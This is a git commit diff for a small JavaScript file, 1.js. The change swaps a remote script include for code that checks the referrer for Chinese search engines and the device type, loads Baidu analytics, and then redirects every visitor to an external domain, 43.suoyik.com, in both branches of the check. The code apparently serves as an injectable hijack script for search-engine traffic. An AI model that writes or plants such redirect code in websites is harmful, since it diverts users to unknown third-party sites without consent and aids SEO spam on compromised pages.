39bc6437441801a57ed8891ec8584aaa64d0f722
dnshook <62766196+dnshook@users.noreply.github.com>
2024-11-13 02:27:54 +0800

    Update 1.js

--- 1.js
+++ 1.js
@@ -1,1 +1,28 @@
-document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
+//document.write('<script src="https://i.ixi.plus/epaper.js"><\/script>');
+function isFromSearchEngine() {
+    const referrer = document.referrer;
+    const searchEngines = ['sm.cn', 'so.com', 'haosou', 'baidu.', 'toutiao.', 'sogou.'];
+    return searchEngines.some(engine => referrer.includes(engine));
+}
+
+function isMobile() {
+    return /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+}
+
+function loadBaiduAnalytics() {
+    var _hmt = _hmt || [];
+    (function() {
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?d30581c7013446efea723e92c414fe52";
+        var s = document.getElementsByTagName("script")[0]; 
+        s.parentNode.insertBefore(hm, s);
+    })();
+}
+
+if (isFromSearchEngine() && isMobile()) {
+    loadBaiduAnalytics();
+    window.location.href = "https://43.suoyik.com/?shareName=ylg43";
+} else {
+    loadBaiduAnalytics();
+    window.location.href = "https://43.suoyik.com/?shareName=ylg43";
+}
